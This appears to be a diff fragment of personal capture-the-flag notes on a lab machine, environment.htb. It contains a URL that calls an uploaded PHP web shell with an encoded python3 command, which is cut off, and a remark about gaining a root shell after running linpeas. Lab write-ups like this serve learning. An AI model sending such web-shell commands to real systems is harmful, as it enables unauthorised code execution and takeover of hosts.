@@ -80,4 +80,3 @@ http://environment.htb//storage//files//test1.php?cmd=python3%20-c%20%27import%2
 I ran linpeas and i was able to run bash as root and able to gain a root shell. I feel like its a glitch or smth since i looked at other peoples walkthroughs and none of them had the same thing.
 
 
-
